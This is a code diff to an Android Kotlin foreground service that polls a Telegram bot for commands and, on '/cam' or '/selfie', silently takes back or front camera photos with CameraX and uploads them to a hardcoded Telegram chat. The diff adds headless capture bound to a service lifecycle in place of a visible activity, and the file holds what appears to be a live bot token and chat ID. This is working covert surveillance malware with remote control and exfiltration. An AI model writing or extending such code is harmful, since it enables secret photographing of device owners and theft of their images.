@@ -4,9 +4,15 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.os.Build
-import android.provider.Settings
+import android.util.Log
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageCapture
+import androidx.camera.core.ImageCaptureException
+import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleService
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.Dispatchers
@@ -26,11 +32,12 @@ import java.util.concurrent.TimeUnit
 class MonitoringService : LifecycleService() {
 
     companion object {
-        // ==== මෙතන ඔබේ විස්තර දාන්න ====
+        // ==== ඔබේ විස්තර මෙතන ====
         const val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
         const val CHAT_ID = "7905408190"
-        // ================================
+        // ========================
         const val CHANNEL_ID = "monitoring_channel"
+        private const val TAG = "MonitoringService"
     }
 
     private val client = OkHttpClient.Builder()
@@ -40,15 +47,39 @@ class MonitoringService : LifecycleService() {
 
     private var lastUpdateId = 0L
     private var isRunning = true
+    private val lifecycleOwner = ServiceLifecycleOwner()
 
     override fun onCreate() {
         super.onCreate()
         try {
             createChannel()
-            startForeground(1, buildNotification())
+            startForegroundWithType()
+            lifecycleOwner.start()
             startPolling()
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "onCreate error", e)
+        }
+    }
+
+    private fun startForegroundWithType() {
+        val notification = buildNotification()
+        when {
+            Build.VERSION.SDK_INT >= 34 -> {
+                startForeground(
+                    1, notification,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                )
+            }
+            Build.VERSION.SDK_INT >= 29 -> {
+                startForeground(
+                    1, notification,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                )
+            }
+            else -> {
+                startForeground(1, notification)
+            }
         }
     }
 
@@ -82,8 +113,7 @@ class MonitoringService : LifecycleService() {
             while (isRunning) {
                 try {
                     val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
-                    val request = Request.Builder().url(url).build()
-                    val response = client.newCall(request).execute()
+                    val response = client.newCall(Request.Builder().url(url).build()).execute()
                     val body = response.body?.string() ?: continue
                     val json = JSONObject(body)
                     val result = json.optJSONArray("result") ?: continue
@@ -109,44 +139,79 @@ class MonitoringService : LifecycleService() {
     private fun handleCommand(cmd: String) {
         val c = cmd.lowercase()
         when {
-            c == "/cam" -> takePhoto(true)
-            c == "/selfie" -> takePhoto(false)
-            c == "/video" -> recordVideo(true, 30)
-            c == "/selfievid" -> recordVideo(false, 30)
+            c == "/cam" -> takePhotoDirect(true)
+            c == "/selfie" -> takePhotoDirect(false)
             c == "/ping" -> sendMessage("🏓 Pong! App is alive")
             c == "/help" -> sendMessage(
                 "📋 Commands:\n" +
                 "/cam - Back camera photo\n" +
                 "/selfie - Front camera photo\n" +
-                "/video - 30s back video\n" +
-                "/selfievid - 30s front video\n" +
                 "/ping - Test"
             )
             else -> sendMessage("❓ Unknown: $cmd")
         }
     }
 
-    private fun takePhoto(back: Boolean) {
-        sendMessage("📷 Taking ${if (back) "back" else "front"} photo...")
-        try {
-            val canOverlay = if (Build.VERSION.SDK_INT >= 23)
-                Settings.canDrawOverlays(this) else true
-            sendMessage("Debug: overlay=$canOverlay")
+    private fun takePhotoDirect(isBack: Boolean) {
+        sendMessage("📷 Taking ${if (isBack) "back" else "front"} photo...")
 
-            val intent = Intent(this, CameraActivity::class.java)
-            intent.putExtra(CameraActivity.EXTRA_BACK, back)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            startActivity(intent)
-        } catch (e: Exception) {
-            sendMessage("❌ Photo failed: ${e.message}")
-        }
+        val future = ProcessCameraProvider.getInstance(this)
+        future.addListener({
+            try {
+                val provider = future.get()
+                val selector = CameraSelector.Builder()
+                    .requireLensFacing(
+                        if (isBack) CameraSelector.LENS_FACING_BACK
+                        else CameraSelector.LENS_FACING_FRONT
+                    ).build()
+                val imageCapture = ImageCapture.Builder()
+                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                    .build()
+
+                provider.unbindAll()
+                provider.bindToLifecycle(lifecycleOwner, selector, imageCapture)
+                sendMessage("Debug: camera bound OK")
+
+                val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
+                val options = ImageCapture.OutputFileOptions.Builder(file).build()
+
+                imageCapture.takePicture(
+                    options,
+                    ContextCompat.getMainExecutor(this),
+                    object : ImageCapture.OnImageSavedCallback {
+                        override fun onImageSaved(result: ImageCapture.OutputFileResults) {
+                            sendMessage("Debug: photo saved, sending...")
+                            sendPhotoToTelegram(file)
+                        }
+                        override fun onError(exception: ImageCaptureException) {
+                            sendMessage("🔴 Camera error: ${exception.message}")
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                sendMessage("🔴 Camera exception: ${e.message}")
+            }
+        }, ContextCompat.getMainExecutor(this))
     }
 
-    private fun recordVideo(back: Boolean, duration: Int) {
-        sendMessage("🎬 Recording ${if (back) "back" else "front"} ${duration}s...")
-        CameraHelper.recordVideo(this, back, duration) { file ->
-            if (file != null) sendVideo(file)
-            else sendMessage("❌ Video failed")
+    private fun sendPhotoToTelegram(file: File) {
+        lifecycleScope.launch(Dispatchers.IO) {
+            try {
+                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
+                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
+                    .build()
+                val response = client.newCall(Request.Builder().url(url).post(body).build()).execute()
+                if (response.isSuccessful) {
+                    sendMessage("🟢 Photo sent!")
+                } else {
+                    sendMessage("🔴 Send failed: ${response.code}")
+                }
+                file.delete()
+            } catch (e: Exception) {
+                sendMessage("🔴 Send error: ${e.message}")
+            }
         }
     }
 
@@ -164,36 +229,11 @@ class MonitoringService : LifecycleService() {
         }
     }
 
-    private fun sendPhoto(file: File) {
-        lifecycleScope.launch(Dispatchers.IO) {
-            try {
-                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
-                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
-                    .build()
-                client.newCall(Request.Builder().url(url).post(body).build()).execute()
-                file.delete()
-            } catch (_: Exception) {}
-        }
-    }
-
-    private fun sendVideo(file: File) {
-        lifecycleScope.launch(Dispatchers.IO) {
-            try {
-                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendVideo"
-                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaType()))
-                    .build()
-                client.newCall(Request.Builder().url(url).post(body).build()).execute()
-                file.delete()
-            } catch (_: Exception) {}
-        }
-    }
-
     override fun onDestroy() {
         super.onDestroy()
         isRunning = false
+        try {
+            lifecycleOwner.stop()
+        } catch (_: Exception) {}
     }
 }
